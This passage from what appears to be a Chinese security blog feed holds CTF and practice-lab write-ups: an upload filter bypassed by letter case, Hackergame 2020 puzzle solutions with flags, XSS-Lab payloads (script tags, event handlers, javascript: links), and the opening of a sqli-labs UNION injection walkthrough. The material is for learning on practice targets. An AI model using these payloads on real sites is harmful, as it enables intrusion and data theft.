class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        $file_ext = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//首尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.date(<span class="string">&quot;YmdHis&quot;</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).$file_ext;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">&#x27;此文件类型不允许上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    细心的话可以发现，这道题的源码中在末尾添加了<code>.htaccess</code>文件过滤，但是也少了一条语句</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br></pre></td></tr></table></figure><p>目标就很明确了，直接使用大小写绕过过滤。</p><p><img src="https://s1.ax1x.com/2020/11/09/BTLmNj.png"></p><p>​    打开图片成功执行。完工</p>]]></content>
      
      
      <categories>
          
          <category> DROPS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文件上传漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hackgame2020(二)</title>
      <link href="2020/Hackgame20202/"/>
      <url>2020/Hackgame20202/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h3 id="一闪而过的Flag"><a href="#一闪而过的Flag" class="headerlink" title="一闪而过的Flag"></a>一闪而过的Flag</h3><p>​    根据题目信息<strong>程序每次运行时隐约可见黑色控制台上有 flag 一闪而过</strong>，我想到了应该能看程序的代码啥的找到，但是<del>天下武功，唯快不破</del>，下载 运行 截图一气呵成。</p><p>​    <img src="https://s1.ax1x.com/2020/11/09/B7TOUA.png"></p><p>​    接下来让我康康哪一位是<del>瞎子</del>，包括答案里也是满满的嘲讽。</p><p><strong>参考答案：flag{Are_you_eyes1ght_g00D?_can_you_dIst1nguish_1iI?}</strong></p><h3 id="从零开始的记账工具人"><a href="#从零开始的记账工具人" class="headerlink" title="从零开始的记账工具人"></a>从零开始的记账工具人</h3><p>​    <del>npy</del>给了我一张账单，让我计算账单上面的金额，flag就是由金额组成的。本以为是一个简单的Excel的表格函数解决，打开我傻了。</p><p><img src="https://s1.ax1x.com/2020/11/05/B2Flxf.png"></p><p>​    原来是搞这个大小写金额的转换，没见过Excel有这种操作就去百度，转了一大圈，网上只有数字转大写金额的，没有反过来的。还去了github上找代码，发现运行的结果和自己想要的还是有些出入。卡了有足足半天，之后自己写了一个Java代码跑了一遍，代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Scanner sn = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">        String str;</span><br><span class="line">        <span class="keyword">int</span> x;</span><br><span class="line">        <span class="keyword">int</span> cnt=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">double</span> result=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(cnt++!=<span class="number">1000</span>)&#123;</span><br><span class="line">            str = sn.next();</span><br><span class="line">            x = sn.nextInt();</span><br><span class="line">            result += tonum(str)*x;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(result);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">double</span> <span class="title">tonum</span><span class="params">(String s)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> len;</span><br><span class="line">        <span class="keyword">double</span> res=<span class="number">0</span>,temp = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">double</span> result=<span class="number">0</span>;</span><br><span class="line">        len = s.length();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;len;i++)&#123;</span><br><span class="line">            <span class="keyword">switch</span> (s.charAt(i))&#123;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;壹&#x27;</span>: temp=<span class="number">1</span>;<span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;贰&#x27;</span>: temp=<span class="number">2</span>;<span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;叁&#x27;</span>: temp=<span class="number">3</span>;<span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;肆&#x27;</span>: temp=<span class="number">4</span>;<span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;伍&#x27;</span>: temp=<span class="number">5</span>;<span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;陆&#x27;</span>: temp=<span class="number">6</span>;<span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;柒&#x27;</span>: temp=<span class="number">7</span>;<span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;捌&#x27;</span>: temp=<span class="number">8</span>;<span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;玖&#x27;</span>: temp=<span class="number">9</span>;<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;零&#x27;</span>: <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;拾&#x27;</span>: res+=temp*<span class="number">10</span>;temp=<span class="number">0</span>;<span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;佰&#x27;</span>: res+=temp*<span class="number">100</span>;temp=<span class="number">0</span>;<span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;元&#x27;</span>: res+=temp;temp=<span class="number">0</span>;<span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;角&#x27;</span>: res+=temp*<span class="number">0.1</span>;temp=<span class="number">0</span>;<span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;分&#x27;</span>: res+=temp*<span class="number">0.01</span>;temp=<span class="number">0</span>;<span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;整&#x27;</span>: <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">default</span>:</span><br><span class="line">                    System.out.println(<span class="string">&quot;这个认不出来&quot;</span> + s.charAt(i));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>​    程序用的控制台输入，直接表格两列从头拉倒尾粘贴，出答案。程序的思路就是把金额大写当做字符串处理，每一位用<code>switch</code>判断数字或是个、十、百、千那一位上的数字。</p><p><img src="https://s1.ax1x.com/2020/11/05/B2F7ee.png"></p><p>​    Java渣轻喷。</p><p><strong>参考答案：flag{19115.33}</strong></p><h3 id="超简单的世界模拟器"><a href="#超简单的世界模拟器" class="headerlink" title="超简单的世界模拟器"></a>超简单的世界模拟器</h3><p>​    这道题下面有两道小题</p><h3 id="蝴蝶效应"><a href="#蝴蝶效应" class="headerlink" title="蝴蝶效应"></a>蝴蝶效应</h3><p>​    先看有意思的一个漫画</p><p><img src="https://s1.ax1x.com/2020/11/05/B2k9eg.png"></p><p>​    一个人用石头模拟了一整个宇宙，斯巴拉西。</p><p>​    打开题目以后是一个终端，然提示等待你输入一个*<em>15</em>15矩阵<strong>（只能有0和1组成），看到这挺懵的，但是题目里有一个重要信息</strong>生命游戏<strong>，百度百科看了一下这个<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E7%94%9F%E5%91%BD%E6%B8%B8%E6%88%8F/2926434?fr=aladdin">生命游戏</a>，游戏的规则大致就是：</strong>一个细胞会根据周围的细胞数量判断存活和死亡**，然后细胞会不断演算，这个和前面的漫画有异曲同工之妙。</p><p>​    返回终端里面一片白中间有几个框框<img src="https://s1.ax1x.com/2020/11/05/B2ZFBT.png">，题目中</p><blockquote><p>如果被特殊标注的正方形内的细胞被“清除”，你将会得到对应的 flag：</p><p>“清除”任意一个正方形，你将会得到第一个 flag。同时“清除”两个正方形，你将会得到第二个 flag。</p></blockquote><p>​    用细胞去碰框框就是了，正好也看到了一个知乎的提问：<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E7%94%9F%E5%91%BD%E6%B8%B8%E6%88%8F/2926434?fr=aladdin"><em>生命游戏</em>(Game of Life)有哪些图形? - 知乎</a>，看了看内容更有趣了。</p><p><img src="https://s1.ax1x.com/2020/11/05/B2elzn.png"></p><p>​    大师我悟了，就是提供一个初始的*<em>15</em>15矩阵<strong>，根据</strong>生命游戏**的规则进行演算，然后去消除黑框框。我臭屁完了直接贴图形</p><ul><li>第一关</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">000000000000000</span><br><span class="line">000000000000000</span><br><span class="line">000000000000000</span><br><span class="line">000000000000000</span><br><span class="line">000000000000000</span><br><span class="line">000000000000000</span><br><span class="line">000000000011000</span><br><span class="line">000000000111100</span><br><span class="line">000000000110110</span><br><span class="line">000000000001100</span><br><span class="line">000000000000000</span><br><span class="line">000000000000000</span><br><span class="line">000000000000000</span><br><span class="line">000000000000000</span><br><span class="line">000000000000000</span><br></pre></td></tr></table></figure><p>​    第一关打上面的黑框，刚好在上面15行的范围内，用一个<strong>轻量级飞船</strong>直线打过去即可。</p><ul><li>第二关</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">000000000000000</span><br><span class="line">000000000000000</span><br><span class="line">000000000000000</span><br><span class="line">000000000000000</span><br><span class="line">000000000011000</span><br><span class="line">000000000111100</span><br><span class="line">000000000110110</span><br><span class="line">000000000001100</span><br><span class="line">000000000000000</span><br><span class="line">001100000000000</span><br><span class="line">011110000000000</span><br><span class="line">011011000001100</span><br><span class="line">000110000011110</span><br><span class="line">000000000011011</span><br><span class="line">000000000000110</span><br></pre></td></tr></table></figure><p>​    第二关我期初试了试<strong>滑翔者</strong>放在右上角以便能打到最远距离，但是和第二个都是擦肩而过。于是我就乱试乱拼凑，最后拼出来一个<strong>三飞船</strong>，正好把两个黑框都给消了。</p><p><strong>参考答案：</strong></p><p><strong>1. flag{D0_Y0U_l1k3_g4me_0f_l1fe?_d5e1c80641}</strong></p><p><strong>2. flag{1s_th3_e55ence_0f_0ur_un1ver5e_ju5t_c0mputat1on?_ea3e769cb8}</strong></p><p>完工。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hackergame 2020 </tag>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS-Lab (一)</title>
      <link href="2020/XSS-Lab1/"/>
      <url>2020/XSS-Lab1/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="头"><a href="#头" class="headerlink" title="头"></a>头</h2><p>靶机地址：<a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#XSS-Lab">https://buuoj.cn/challenges#XSS-Lab</a></p><p><img src="https://s1.ax1x.com/2020/11/03/BsmJ5n.png"></p><h2 id="level-1"><a href="#level-1" class="headerlink" title="level 1"></a>level 1</h2><p>​    <img src="https://s1.ax1x.com/2020/11/03/BsmfKO.png"></p><p>​    观察发现<code>欢迎用户test</code>与URL中的<code>name=test</code>字段对应，尝试修改发现可行。直接将<code>name</code>字段改为<code>name=&lt;script&gt;alert()&lt;/script&gt;</code>，完工。</p><h2 id="level-2"><a href="#level-2" class="headerlink" title="level 2"></a>level 2</h2><p><img src="https://s1.ax1x.com/2020/11/03/BsnwWt.png"></p><p>​    在搜索栏中的输入会回显到页面，查看网页源代码，发现值在<code>input</code>的<code>value</code>属性中</p><p><img src="https://s1.ax1x.com/2020/11/03/BsnLk9.png"></p><p>​    构造闭合<code>&quot;&gt; &lt;script&gt;alert()&lt;/script&gt; // </code>，构造以后的标签会变成<code>.... value=&quot;&quot;&gt; &lt;script&gt;alert()&lt;/script&gt; // &quot;&gt;</code>。完工</p><h2 id="level-3"><a href="#level-3" class="headerlink" title="level 3"></a>level 3</h2><p><img src="https://s1.ax1x.com/2020/11/03/BsKwKf.png"></p><p>​    老样子构造<code>value</code>属性闭合，尝试<code>&quot;&gt; &lt;script&gt;alert()&lt;/script&gt; // </code>构造闭合，查看网页源代码发现语句变成<code>&amp;quot;&amp;gt; &amp;lt;script&amp;gt;alert()&amp;lt;/script&amp;gt; // </code>，说明把<code>&quot;、&lt;、&gt;、</code>进行了html编码过滤，尝试构造<code>onmouseover</code>事件(鼠标移到事件)，构造语句<code>&#39;onmouseover=&#39;alert()&#39;</code>。完工</p><h2 id="level-4"><a href="#level-4" class="headerlink" title="level 4"></a>level 4</h2><p><img src="https://s1.ax1x.com/2020/11/03/BsMWYd.png"></p><p>​    构造闭合<code>&quot;&gt; &lt;script&gt;alert()&lt;/script&gt; // </code>，查看源代码发现进行了<code>&gt;、&lt;</code>过滤，尝试构造事件<code>&quot; onmouseover=&#39;alert()&#39;</code>。完工</p><p>​    说明一下标签的事件有很多类型，可以自己试试别的事件响应。</p><h2 id="level-5"><a href="#level-5" class="headerlink" title="level 5"></a>level 5</h2><p><img src="https://s1.ax1x.com/2020/11/03/Bs1Ci4.png"></p><p>​    检查一下都有什么过滤。发现有一下过滤</p><blockquote><p>script –&gt; scr_ipt</p><p>onmouseover –&gt; o_nmouseover</p></blockquote><p>无法采用事件，那么尝试构造一个标签<code> &quot;&gt; &lt;a href=&#39;javascript:alert()&#39;&gt;233&lt;/a&gt; //</code>，发现<code>javascript</code>没有过滤，说明判断语句匹配值仅仅为<code>script</code>，点击构造的<code>&lt;a&gt;</code>标签内容。完工</p><p>​    </p>]]></content>
      
      
      <categories>
          
          <category> DROPS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hackgame2020(一)</title>
      <link href="2020/Hackgame20201/"/>
      <url>2020/Hackgame20201/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>比赛地址：<a target="_blank" rel="noopener" href="https://hack.lug.ustc.edu.cn/">https://hack.lug.ustc.edu.cn/</a></p><h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h3 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h3><p>​    第一题是flag提取器，打开题目以后页面是一个提取器下面一个<code>进度条</code>和一个<code>提取</code>按钮。</p><p><img src="https://s1.ax1x.com/2020/11/01/BwJbJs.png" alt="BwJbJs.png"></p><p>​    随便拉了拉进度条发现初始是<code>0</code>末尾是<code>1.5</code>，然后中间的数值都是小数</p><p><img src="https://s1.ax1x.com/2020/11/01/BwYAQx.png" alt="BwYAQx.png"></p><p>​    我猜的题目可能是想让数值为<code>1</code>时能提取到flag。</p><p>​    F12查看源代码，定位到进度条的标签，查看属性</p><p><img src="https://s1.ax1x.com/2020/11/01/BwYoX6.png"></p><p>​    确实和猜测一样最大最小值分别是<code>0</code>、<code>1.5</code>，注意到<code>step</code>值为<code>0.00001</code>，就是这个属性让我们拖动进度条时，递增的值是小数，想精准得到<code>1</code>个flag，就把网页上的<code>step</code>值改为<code>1</code>。然后随便拖动一下进度条得到<code>1</code>，点击<code>提取</code>按钮，完工。</p><p><img src="https://s1.ax1x.com/2020/11/01/BwNVaD.png"></p><h3 id="2048"><a href="#2048" class="headerlink" title="2048"></a>2048</h3><p>​    打开题目是一个<code>2048</code>的小游戏，第一个想法就是玩<code>2048</code>达到一定分数以后会获得flag（<del>可恶这个比赛怎么知道最近我天天在玩2048的</del>）,但是想比赛不可能让选手在线玩游戏吧，尤其对于我这种<del>逃课废物</del>是不可能努力哒！</p><p>F12开始翻网页资源</p><p><img src="https://s1.ax1x.com/2020/11/01/BwUONF.png"></p><p>​    还好上次<del>摸鱼</del>课题做了一个网页版的2048，略微能看懂一点点结构，第一个<code>animframe_polyfill</code>应该就是管动画效果的，<code>keynpard...</code>这个肯定是相应按键的，<code>local_storage_manager</code>应该是保存游戏的，<code>game_manager</code>感觉就是管理整个游戏的主要文件。</p><p>​    打开<code>game_manager</code>粗略的看了下变量，<code>score</code> 分数、<code>over、won、keepPlaying</code>游戏状态，想赢游戏肯定是和<code>score、won</code>有关，直接Ctrl+F搜索整个文档这两个变量出现的位置。</p><p>发现了</p><p><img src="https://s1.ax1x.com/2020/11/01/BwdGdK.png"></p><p>​    只有这里修改了<code>won</code>的状态，前面还有个<code>16384</code>这个应该就是获得胜利需要得到的分数，这个分数对于我来说还是简简单单（<del>小声bb</del><a target="_blank" rel="noopener" href="https://s1.ax1x.com/2020/11/01/BwUdte.jpg">截图为证</a>），直接让<code>if</code>里面的语句为真就可以获胜，直接修改<code>if(1) self.won = true</code>，保存文件，按一个方向键让语句执行到，完工。</p><p><img src="https://s1.ax1x.com/2020/11/01/BwwpTK.png"></p><h1 id="general"><a href="#general" class="headerlink" title="general"></a>general</h1><h3 id="猫咪问题"><a href="#猫咪问题" class="headerlink" title="猫咪问题++"></a>猫咪问题++</h3><p>​    秉着前面题都是简单题，试着做了一下，看到题目提示的有往年的问题题解</p><p><img src="https://s1.ax1x.com/2020/11/01/BwLtDs.png"></p><p>​    题意思很明显的书考验同学的搜题技巧。那就开工。</p><p><img src="https://s1.ax1x.com/2020/11/01/BwLD8U.png"></p><h4 id="第一题"><a href="#第一题" class="headerlink" title="第一题"></a>第一题</h4><blockquote><ol><li>以下编程语言、软件或组织对应标志是哺乳动物的有几个？</li></ol><p>Docker，Golang，Python，Plan 9，PHP，GNU，LLVM，Swift，Perl，GitHub，TortoiseSVN，FireFox，MySQL，PostgreSQL，MariaDB，Linux，OpenBSD，FreeDOS，Apache Tomcat，Squid，openSUSE，Kali，Xfce.</p><p>提示：学术上一般认为龙不属于哺乳动物。</p></blockquote><p>​    本人只认识几个，那就一个一个搜呗。我的模式是：百度<code>xxx标志</code>然后第二条就是百度图片的搜索结果，大致辨别一下，然后再百度<code>xxx是哺乳动物吗</code>，妥妥的<del>胎儿</del>教学。</p><p>​    一个比较有印象就是<code>FreeDOS</code>这个标志就离谱，什么玩意</p><p><img src="https://src.onlinedown.net/supply/sup_logo/logo-1122/46778_g.jpg"></p><p><strong>参考答案 ：12</strong> </p><h4 id="第二题"><a href="#第二题" class="headerlink" title="第二题"></a>第二题</h4><blockquote><ol start="2"><li>第一个以信鸽为载体的 IP 网络标准的 RFC 文档中推荐使用的 MTU (Maximum Transmission Unit) 是多少毫克？</li></ol></blockquote><p>​    卡了我好一会，没听过信鸽传输，贴上最后找到答案的<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_31621387/article/details/77690642">博客</a>，以及一篇信鸽传输的<a href="sohu.com/a/309403082_354973">历史发展</a>，长见识了。</p><p><strong>参考答案：256</strong></p><h4 id="第三题"><a href="#第三题" class="headerlink" title="第三题"></a>第三题</h4><blockquote><ol start="3"><li><p>USTC Linux 用户协会在 2019 年 9 月 21 日自由软件日活动中介绍的开源游戏的名称共有几个字母？</p><p>提示：活动记录会在哪里？</p></li></ol></blockquote><p>​    搜索<code>USTC Linux 用户协会</code>发现这个协会就是科大爱好者们创建的。那么直接摸到他们官网的<a target="_blank" rel="noopener" href="https://lug.ustc.edu.cn/news/">新闻版块</a>（百度搜出来的是旧站，里面有新站的网址）。题目中还写道<code>2019年9月21日自由软件日活动</code>，那么官网肯定有那天的新闻。</p><p>​    找到一篇当天的新闻<a target="_blank" rel="noopener" href="https://lug.ustc.edu.cn/news/2019/09/2019-sfd-ustc/">2019 软件自由日中国科大站</a>，进取直接找，文章末尾有</p><blockquote><p>最后一项是李文睿同学介绍了开源游戏 Teeworlds，由于底层代码开源，开发者可以做出自己的定制，可玩性非常高。</p></blockquote><p>​    答案就是<code>Teeworlds</code></p><p>​    我还摸到了他们当天活动的记录资料：<a target="_blank" rel="noopener" href="https://ftp.lug.ustc.edu.cn/%E6%B4%BB%E5%8A%A8/2019.09.21_SFD/">点我</a></p><p>​    在<code>slides\闪电演讲\Teeworlds</code>文件夹下有应该作者演讲的PPT和游戏的视频演示，有点心动了🤣</p><p><strong>参考答案：9</strong></p><h4 id="第四题"><a href="#第四题" class="headerlink" title="第四题"></a>第四题</h4><blockquote><ol start="4"><li>中国科学技术大学西校区图书馆正前方（西南方向） 50 米 L 型灌木处共有几个连通的划线停车位？</li></ol></blockquote><p>​    直接百度地图搜图书馆，然后全景地图房门口，视野拉到L型灌木那。</p><p><img src="https://s1.ax1x.com/2020/11/01/BwvkdA.png"></p><p><strong>参考答案：9</strong></p><h4 id="第五题"><a href="#第五题" class="headerlink" title="第五题"></a>第五题</h4><blockquote><ol start="5"><li>中国科学技术大学第六届信息安全大赛所有人合计提交了多少次 flag？</li></ol></blockquote><p>​    百度<code>中国科学技术大学第六届信息安全大赛</code>有个<code>...圆满结束</code>，就他了。点开第二行就是<code>经统计，在本次比赛中，总共有 2682 人注册，1904 人至少完成了一题。比赛期间所有人合计提交了 17098 次 flag</code>。（看这个网站的标志似乎还是第三题搜的那个<code>USTC Linux 用户协会</code>的官网新闻。嗷原来题目上已经说了是举办方👀）</p><p><strong>参考答案：17098</strong></p><p>完工。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> Hackergame 2020 </tag>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sql-labs(一)</title>
      <link href="2020/sql-labs1/"/>
      <url>2020/sql-labs1/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在线靶机地址：<a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#sqli-labs">https://buuoj.cn/challenges#sqli-labs</a></p><h2 id="less-1"><a href="#less-1" class="headerlink" title="less-1"></a>less-1</h2><p>​    首先说明sql注入的大致步骤：</p><ul><li>判断注入类型。如整型字符型注入等。</li><li>判断列数</li><li>判断数据的回显位</li><li>构造sql语句</li></ul><p>​    根据题目提示，说明是一个单引号注入题目，构造一个带单引号的语句<code>?id=1&#39;</code>，发现数据库报错</p><p><img src="https://s1.ax1x.com/2020/11/04/BgERNd.png"></p><p>​    通过后面的报错语句<code>1&#39;&#39; LIMIT 0,1</code>的分析，我们的单引号被数据库解析，那么说明我们也可以使用连接查询<code>union</code>插入我们想要查询的语句。</p><p>​    推出数据库的查询的部分语句可能为<code>where id = &#39;$id&#39;LIMIT 0,1</code>，那么通过构造闭合<code>?id=1&#39; [这里添加语句] --+</code>添加自己想要语句，语句后面的<code>--+</code>作用是将后面的其他语句注释掉。</p><p>​    首先是判断字段个数：<code>?id=1&#39; order by 1 --+</code>，页面显示正常，直到尝试<code>?id=1&#39; order by 4 --+</code>发现数据库报错</p><p><img src="https://s1.ax1x.com/2020/11/04/BgVsGn.png"></p><p>​    说明数据库的字段值只有四个。</p><p>​    接下来测试数据的回显位，构造语句<code>?id=&#39; union select 1,2,3 --+</code>，这里需要注意的有，前面<code>id</code>的查询一定是要不存在的，因为数据库只会回显第一条查询的数据，如果第一条语句查询成功则后面<code>union</code>构造的语句就不会显示；<code>union</code>连接查询语句后面查询的字段数需要和前面的字段数相等，详细用法可以自行查询。</p><p>​    执行后页面显示。</p><p><img src="https://s1.ax1x.com/2020/11/04/BgZAeS.png"></p><p>​    说明查询语句的<code>2,3</code>是回显位，之后就可以将查询的语句进行替换。如：</p><p>​    获取数据库版本，数据库路径，当前用户，当前数据库：<br>​    <code>?id=&#39; union select 1,concat_ws(&#39;_&#39;,user(),version(),database()),@@basedir --+</code> </p><p>页面显示</p><p><img 